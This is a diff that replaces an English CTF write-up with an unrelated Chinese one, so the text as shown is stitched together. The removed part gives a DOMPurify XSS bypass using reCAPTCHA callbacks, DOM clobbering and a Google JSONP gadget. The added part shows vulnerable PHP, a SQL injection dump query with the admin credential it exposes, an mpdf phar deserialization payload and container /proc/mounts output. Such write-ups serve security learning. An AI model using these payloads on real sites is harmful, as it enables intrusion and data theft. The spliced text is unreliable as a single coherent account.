@@ -1,233 +1,284 @@
-function sanitize(html, options = defaultOptions) {
-  return DOMPurify.sanitize(html, {
-    FORBID_TAGS: options.blockTags || [],
-    FORBID_ATTR: options.blockAttrs || [],
-    FORCE_BODY: options.forceBody,
-    WHOLE_DOCUMENT: options.wholeDocument,
-    KEEP_CONTENT: !options.removeContent,
-    SANITIZE_DOM: !options.allowDOM,
-  })
-}
-
-function loadData(sanitizeOptions) {
-  const params = (new URL(document.location)).searchParams
-  const name = params.get('name')
-  const content = params.get('content')
-
-  if (!content) return
-
-  // hide some elements, we don't need it
-  document.querySelector('.title').innerText = 'Note'
-  document.querySelector('.input-type').style = 'display: none';
-  document.querySelector('.input-date').style = 'display: none';
-  document.querySelector('.input-mode').style = 'display: none';
-  document.querySelector('#input-content').style = 'display: none';
-  document.querySelector('#submit').style = 'display: none';
-  document.querySelector('#clear').style = 'display: none';
-  document.querySelector('#reload').style = "display:none"
-
-  document.querySelector('input[name=creator]').value = name
-  const result = sanitize(content, sanitizeOptions)
-  renderer.style = "width:100%; min-height: 400px;display: block"
-  renderer.innerHTML = result
-}
-
-loadData({
-  blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'],
-  blockAttrs: [],
-  forceBody: false,
-  wholeDocument: false,
-  allowDOM: false,
-  removeContent: true
-})
-```
-
-When the app is loaded, in `loadData` function, it reads data from the URL and then renders it to `innerHTML` after sanitized, that's all.
-
-For sanitizing, the config is pretty much the default one, so you can't perform XSS directly unless you find a 0-day bypass:
-
-``` js
-function sanitize(html, options = defaultOptions) {
-  return DOMPurify.sanitize(html, {
-    FORBID_TAGS: options.blockTags || [],
-    FORBID_ATTR: options.blockAttrs || [],
-    FORCE_BODY: options.forceBody,
-    WHOLE_DOCUMENT: options.wholeDocument,
-    KEEP_CONTENT: !options.removeContent,
-    SANITIZE_DOM: !options.allowDOM,
-  })
-}
-
-loadData({
-  blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'],
-  blockAttrs: [],
-  forceBody: false,
-  wholeDocument: false,
-  allowDOM: false,
-  removeContent: true
-})
-```
-
-What can we do by injecting a harmless HTML? Not much, unless you leverage another functionality.
-
-### reCAPTCHA to the rescue
-
-Somehow, the challenge uses Google reCAPTCHA, and from their [docs](https://developers.google.com/recaptcha/docs/invisible#render_param) we know that we can trigger a function call by injecting the following HTML:
-
-``` html
-<div
-  class="g-recaptcha"
-  data-sitekey="AAA"
-  data-error-callback="any_function_here"
-  data-size="invisible">
-</div>
-```
-
-By providing a random wrong sitekey, reCAPTCHA will call the function in the attribute `data-error-callback`.
-
-It's important that DOMPurify allows any attributes that start with `data-` by default, and also both `class` and `id` are permitted.
-
-I learned this nifty trick from TSJ CTF 2022 - web/Nim Notes, but it seems that it's from [another XSS challenge](https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue) made by @terjanq in TokyoWesterns CTF 2020.
-
-Now, we can call a function by injecting HTML. The question is, what function should we call?
-
-Both `loadScript` and `reloadRecaptchaScript` are suspicious, but `loadScript` might not be a good target because we can't control the arguments.
-
-How about `reloadRecaptchaScript`?
-
-``` js
-function reloadRecaptchaScript(index) {
-  // delay for a bit to not block main thread
-  setTimeout(() => {
-    console.log('reload', index, document.scripts[index])
-    const element = document.scripts[index]
-    const src = element.getAttribute('src')
-    if (!src.startsWith('https://www.google.com/recaptcha/')) {
-      throw new Error('reload failed, invalid src')
+function session_start_once() {
+    if (!isset($_SESSION)) { 
+        session_start();
     }
-    element.parentNode.removeChild(element)
-    loadScript(src)
-  }, 1000)
 }
-```
 
-If we can control `document.scripts[index]`, we can load another script from `https://www.google.com`.
+session_start_once();
 
-When the reCAPTCHA calls a function, it passes no argument, so the `index` will be `undefined`, so we need to override `document.scripts['undefined']`
 
-Can we control it? Sure, it's DOM clobbering time!
-
-### DOM clobbering
-
-Usually, we can override the attribute on document by providing a `embed`, `form`, `input`, `object` or `img` with `name`, like this:
-
-``` html
-<img name="scripts">
-// document.scripts => <img>
-```
-
-Combining with `form` element, we can clobber `document.scripts['undefined']`:
-
-``` html
-<form name="scripts">
-  <img name="undefined" src="src">
-</form>
-```
-
-But, it's not working because DOMPurify prevents this behavior by default: https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L1015
-
-``` js
-if (
-  SANITIZE_DOM &&
-  (lcName === 'id' || lcName === 'name') &&
-  (value in document || value in formElement)
-) {
-  return false;
+if (!isset($_SESSION['lang'])) {
+    $_SESSION['lang'] = DEFAULT_LANGUAGE;
 }
-```
 
-Fortunately, there is another vulnerability in the code:
+require_once('langs/' . $_SESSION['lang'] . '.php');
 
-``` js
-function sanitize(html, options = defaultOptions) {
-  return DOMPurify.sanitize(html, {
-    FORBID_TAGS: options.blockTags || [],
-    FORBID_ATTR: options.blockAttrs || [],
-    FORCE_BODY: options.forceBody,
-    WHOLE_DOCUMENT: options.wholeDocument,
-    KEEP_CONTENT: !options.removeContent,
-    SANITIZE_DOM: !options.allowDOM,
-  })
+require_once('qrcode.php');
+
+function base64_urlsafe_encode($input) {
+    return strtr(base64_encode($input), '+/', '._');
 }
-```
 
-When calling `sanitize` without `options`, the default value will be `defaultOptions`, so we can clobber `defaultOptions.allowDOM` to make `SANITIZE_DOM` falsy.
+function base64_urlsafe_decode($input) {
+    return base64_decode(strtr($input, '._', '+/'));
+}
 
-Also, we need to call `loadData()` again without any arguments to let `sanitizeOptions` be `undefined`.
 
-To sum up, we can control `document.scripts['undefined']` by providing below HTML:
+$GLOBALS['_pdo'] = false;
 
-``` html
-<div>
-  <form></form>
-  <form name="scripts">
-    <img name="undefined" src="src_here">
-  </form>
-  <form id=defaultOptions>
-    <img name=allowDOM>
-  </form>
-  <div class="g-recaptcha"
-    data-sitekey="AAA"
-    data-error-callback="reloadRecaptchaScript"
-    data-size="invisible">
-  </div>
-  <div class="g-recaptcha"
-    data-sitekey="BBB"
-    data-error-callback="loadData"
-    data-size="invisible">
-  </div>
-</div>
-```
-
-### Load external script
-
-Now, we have control on `document.scripts[index]`, but we still need to bypass another check:
-
-``` js
-function reloadRecaptchaScript(index) {
-  setTimeout(() => {
-    console.log('reload', index, document.scripts[index])
-    const element = document.scripts[index]
-    const src = element.getAttribute('src')
-    if (!src.startsWith('https://www.google.com/recaptcha/')) {
-      throw new Error('reload failed, invalid src')
+function get_pdo() {
+    if ($GLOBALS['_pdo']) {
+        return $GLOBALS['_pdo'];
     }
-    element.parentNode.removeChild(element)
-    loadScript(src)
-  }, 1000)
+    try {
+        $pdo = new PDO(
+                    'mysql:host='.MYSQL_HOST.';dbname='.MYSQL_DATABASE.';charset=utf8mb4',
+                    MYSQL_USER, MYSQL_PASSWORD,
+                    array(
+                        PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES \'utf8mb4\' COLLATE \'utf8mb4_unicode_ci\';',
+                        PDO::ATTR_TIMEOUT => 2
+                    ));
+        $GLOBALS['_pdo'] = $pdo;
+    } catch (Exception $e) {
+        http_response_code(500);
+        die("Failed to connect database. Please contact the administrtor.");
+    }
+    return $pdo;
+}
+
+function get_post_param($key, $default=null) {
+    if (isset($_POST[$key])) {
+        return $_POST[$key];
+    } else {
+        return $default;
+    }
+}
+
+function get_get_param($key, $default=null) {
+    if (isset($_GET[$key])) {
+        return $_GET[$key];
+    } else {
+        return $default;
+    }
+}
+
+function get_client_ip() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
+
+function random_str(
+    int $length = 64,
+    string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+): string {
+    if ($length < 1) {
+        throw new \RangeException("Length must be a positive integer");
+    }
+    $pieces = [];
+    $max = mb_strlen($keyspace, '8bit') - 1;
+    for ($i = 0; $i < $length; ++$i) {
+        $pieces []= $keyspace[random_int(0, $max)];
+    }
+    return implode('', $pieces);
+}
+
+function get_sig_hash($data) {
+    $pdo = get_pdo();
+    $res = $pdo->query("SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1", PDO::FETCH_ASSOC);
+    $row = $res->fetch();
+    if (!$row) {
+        $secret = random_str(64);
+        $pdo->exec("INSERT INTO options VALUES ('sig_secret', '".$secret."'), ('sig_algorithm', 'sha256')");
+    } else {
+        $secret = $row['value'];
+    }
+    $res = $pdo->query("SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1", PDO::FETCH_ASSOC);
+    $algo = $res->fetch()['value'];
+    return hash_hmac($algo, $data, $secret);
+}
+
+function get_timezone() {
+    $pdo = get_pdo();
+    $res = $pdo->query("SELECT `value` FROM options WHERE `key` = 'timezone' LIMIT 1", PDO::FETCH_ASSOC);
+    $row = $res->fetch();
+    if (!$row) {
+        $pdo->exec("INSERT INTO options VALUES ('timezone', 'Asia/Taipei')");
+        $timezone = 'Asia/Taipei';
+    } else {
+        $timezone = $row['value'];
+    }
+    return $timezone;
+}
+
+define('TIMEZONE', get_timezone());
+date_default_timezone_set(TIMEZONE);
+
+function endsWith( $haystack, $needle ) {
+    $length = strlen( $needle );
+    if( !$length ) {
+        return true;
+    }
+    return substr( $haystack, -$length ) === $needle;
+}
+
+
+function order_status_to_text($status) {
+    $text_arr = [
+        ORDER_STATUS_PICKING => '撿貨',
+        ORDER_STATUS_PACKING => '包裝中',
+        ORDER_STATUS_SENDING => '等待貨運士取貨',
+        ORDER_STATUS_DELIVERING => '配送中',
+        ORDER_STATUS_ARRIVED => '貨物已送達',
+        ORDER_STATUS_FINISH => '完成'
+    ];
+    return $text_arr[$status];
 }
 ```
 
-The `src` should start with `https://www.google.com/recaptcha/`, how to overcome this?
+接著看了一下各個檔案，發現 `print.php` 有個很明顯的 SQL Injection：
 
-There is a subtle difference between `element.src` and `element.getAttribute('src')`, the former returns the formatted value, while the latter returns raw value:
+``` php
+<?php
 
-``` html
-<img src="https://example.com/abc/../test">
-// img.src => https://example.com/test
-// img.getAttribute('src') => https://example.com/abc/../test
+require_once('include.php');
+require_once('third_party/vendor/autoload.php');
+
+//require_once('rate_limit.php');
+// rate limit is not working, use random sleep as a workaround
+sleep(random_int(0, 2));
+
+$is_from_print = true;
+
+$id = get_get_param('id', '');
+$sig = get_get_param('sig', '');
+$sig_hash = get_sig_hash($sig);
+$pdo = get_pdo();
+$res = $pdo->query("
+    SELECT *
+    FROM orders 
+    WHERE sig_hash = '$sig_hash' AND id = $id
+    LIMIT 1
+", PDO::FETCH_ASSOC);
+
+try {
+    $order = $res->fetch();
+} catch (Error $e) {
+    $order = [];
+}
+
+ob_start();
+include('pdf.php');
+$html = ob_get_clean();
+
+$mpdf = new \Mpdf\Mpdf([
+    'tempDir' => '/tmp',
+    'autoScriptToLang' => true,
+    'autoLangToFont' => true,
+    'mode' => 'utf-8'
+]);
+$mpdf->SetTitle('收據明細');
+$mpdf->SetSubject('收據明細');
+$mpdf->SetAuthor(random_str((random_int(1, 256))));
+$mpdf->SetCreator(random_str((random_int(1, 256))));
+$mpdf->WriteHTML($html);
+$mpdf->Output();
 ```
 
-By using `../`, we can load any scripts from `https://www.google.com`.
+手動 injection 一下之後可得到下列資訊：
 
-It's easy to find a useful gadget from [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt#L2): `https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1`
+```
+table: rate_limit
+ip,last_visit,visit_times
 
-The response is like:
+table: items
+id,title,description
 
-``` js
-alert && alert(["hello",["hello kitty","hello world","hello kiki","hellolulu","hello venus","hello nico","hello bubble"],["","","","","","","",""],[],{"google:clientdata":{"bpc":false,"phi":0,"tlw":false},"google:suggestrelevance":[601,600,555,554,553,552,551,550],"google:suggestsubtypes":[[512,433],[512,433,131],[512,433,131],[512],[512,433],[512],[512],[512,433,131]],"google:suggesttype":["QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY"],"google:verbatimrelevance":1300}])
+table: options
+key,value
+
+table: backend_users
+id,username,password,description
+admin u=479_p5jV:Fsq(2
+
+table: orders
+id,name,email,phone,status,sig_hash,order_date,address,note
 ```
 
-We can't run arbitrary JS because `callback` is restricted, it won't work if you pass something like `alert(document.domain)`, but we have the ability to call a function with controlled arguments.
+由於只能弄出一列資料，可利用 `GROUP_CONCAT` 幫忙 dump 資料，像這樣：`SELECT 1,GROUP_CONCAT(note),GROUP_CONCAT(name),GROUP_CONCAT(email),5,6,7,8,9 FROM orders
+`
+在 DB 裡面應該是 backend_users 的地方找到了第三個 flag（對，是第三個不是第二個）以及一組帳密，預期之後可能會用到
 
-The idea is simple, we can use it to load AngularJS from cdn.js by leverage the classic `..%2f` trick.
+此時根據剛剛的 `include.php`，得到這個路徑：`third_party/vendor/autoload.php`，很明顯就有用 composer，所以可以去讀 `/proc/self/cwd/third_party/composer.json`，得知只有用一個叫做 mpdf 的套件。
+
+接著來搜尋一下有沒有已知漏洞，找到官方的這個 issue，是由 DEVCORE 的人回報的：[phar:// deserialization and weak randomness of temporary file name may lead to RCE](https://github.com/mpdf/mpdf/issues/1381)
+
+從這個 issue 可以得知兩件事情：
+
+1. 我們可以寫入檔案到 /tmp/mpf/_tempCSSidataX_0.jpeg
+2. 可以利用 `<img src="#1.jpeg" ORIG_SRC="phar://../vendor/mpdf/mpdf/tmp/mpdf/_tempCSSidata1_0.jpeg/a.jpg"></img>` 進行反序列化
+
+但問題來了，要反序列化去觸發攻擊的話需要找到可以利用的 gadget，我在 local 裝了一樣的套件之後，直接在 third_party 資料夾底下搜了 __ 開頭的 method，只有很無用的一些東西，怎麼想都湊不出來 POP 攻擊鍊。
+
+於是我就卡關了。
+
+我想了又想，看了又看，除了這個 phar 的洞有機會打以外，剩下的大概就是 `include.php` 裡面引入 `$_SESSION['lang']` 的部分，如果可以控制 lang 的話就可以引入任意檔案，但問題是 `lang.php` 裡面對於參數的控制沒有洞可以打，除非我們可以直接去改 `/tmp/sess_XXX`，否則打不進去。
+
+但目前唯一可以寫檔的漏洞只有 mpdf 那個，可是檔名有限制，無法寫去任意地方，否則就可以把兩者融合一下。
+
+再來還有一個地方怎麼看怎麼怪，就是我在 DB 裡面打到一組 backend 帳號密碼，照理來說應該要有個後台才對，可以後台在哪裡？
+
+原本在做這種 wargame 或是 CTF 的時候通常都不太需要列舉，但因為真的沒招所以我只好開始爆搜一波，用 ffuf 掃一下任何我覺得有可能的地方，但是一無所獲，所以我就沒招了，完全不知道下一步該如何是好。
+
+這次的 wargame 是週六早上九點開始，我在十點的時候解完上面講的那兩個 flag，然後就卡了一整天。當天晚上我看了一下，解完的只有 6 個人但是 NFT 有好多個，就去聊天室問了一下如果解題狀況不如預期，有沒有打算放出一些提示，後來得到回覆說需要哪方面的資訊。
+
+因為當初規定的解題時間是到週日晚上六點（HITCON 結束），所以我想說等到結束以後再來問提示，就說明了自己的狀況（解完 1 跟 3 以後卡關），後來得到的回覆是可以從弱點 1 再次觀察一下有沒有後台之類的東西。
+
+於是我再次嘗試了各種路徑，最後試到一個我以前有看過但我居然沒試到的東西：`/proc/mounts`，內容長這樣：
+
+```
+overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/DVIDOZY6PBLWVCFYWII5AAUIJZ:/var/lib/docker/overlay2/l/3CV53MMJRHWIZWOHD5WPBJANGZ:/var/lib/docker/overlay2/l/VIRCM74GAO2ULIS6SHAVLYHI7O:/var/lib/docker/overlay2/l/QC5SROY6OOIX6VQUNGJG3T5GMY:/var/lib/docker/overlay2/l/3Z7BTZXFISPKXE3DEG4OUPAB5G:/var/lib/docker/overlay2/l/GDBX5T35WQSMHIY2USJLX6SPRU:/var/lib/docker/overlay2/l/WHFI4IRDVNIOO6MLKCKKAMYQKB:/var/lib/docker/overlay2/l/JLXT6H6QNKB45UIDZANGKVGLPD:/var/lib/docker/overlay2/l/M756SQ7NRKEJCKLHPB2PRKG5Z2:/var/lib/docker/overlay2/l/OY2PWIL6ISIIORC7LZNWWQ6JKN:/var/lib/docker/overlay2/l/GXC3IEBX7YVRSOMH34OAE6Y5LV:/var/lib/docker/overlay2/l/FNJ3ZWM4WCOCANHBZPBTO47K5B:/var/lib/docker/overlay2/l/NRVSBMR3SAZ3PNE5KXGMUQMODK:/var/lib/docker/overlay2/l/2MARFWCP5GVEAG5IBUMLJTABKL:/var/lib/docker/overlay2/l/F67HXFSPANXFWKRP2R5YJHJRBE:/var/lib/docker/overlay2/l/AKYB2LUEDDQPLGHVXECL72U4MK:/var/lib/docker/overlay2/l/B7CFODJXDKC3HEX5ZJD7NAID5A:/var/lib/docker/overlay2/l/5XQVILRBQTSFRMEKB7YW6UTYLB:/var/lib/docker/overlay2/l/6ZMT3PTB6QFDZ2PJOURGMQZIMJ:/var/lib/docker/overlay2/l/4AUQ72KT7D5WLPX3GCGBI576ZS:/var/lib/docker/overlay2/l/HEF7KMRLHAUNHLXAPU5T4QFJJD:/var/lib/docker/overlay2/l/ZEPQYM2UZQKKXKJS62CP5RIRKN:/var/lib/docker/overlay2/l/4BBAOHRGSZ3TVLTD4ZICVZS7C7:/var/lib/docker/overlay2/l/3K7P7JABJCB4HT5HZRXGBFSSAU:/var/lib/docker/overlay2/l/GUW5ZGQOABGYH7KF5IU5JFHG6E:/var/lib/docker/overlay2/l/RKL5CJMH6X7ORW4XAB5HJ3RJ3C:/var/lib/docker/overlay2/l/ZLWG5Z6C6FD3OQEJCZHJHODTTX:/var/lib/docker/overlay2/l/QLSXNQZKZQQ3YDAFJ675RXRFWL:/var/lib/docker/overlay2/l/KHQSPHLSLWASTCLEBPKWK7AABD:/var/lib/docker/overlay2/l/GCM3GAH2MB2FBUK2NUGCCQ6H6R:/var/lib/docker/overlay2/l/FVHE6ZGSGB26C3JN35T36U575B:/var/lib/docker/overlay2/l/A3B3RQ7O6RTEZTZDFCBNL3R2IG:/var/lib/docker/overlay2/l/VWEM5H2WW7HEKTCLCWBPPEV4RA:/var/lib/docker/overlay2/l/QAYAOZL2DM73CJVN7Y3J7MRXDP:/var/lib/docker/overlay2/l/CGI6OQSFKKJRGSKZASWCHJDJIM,upperdir=/var/lib/docker/overlay2/ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b/diff,workdir=/var/lib/docker/overlay2/ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b/work 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
+sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
+tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
+cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
+cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
+cgroup /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
+cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
+cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
+cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
+cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
+cgroup /sys/fs/cgroup/rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0
+cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
+cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
+cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
+cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
+mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
+shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
+/dev/sda /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
+proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
+tmpfs /proc/acpi tmpfs ro,relatime 0 0
+tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/scsi tmpfs ro,relatime 0 0
+tmpfs /sys/firmware tmpfs ro,relatime 0 0
+```
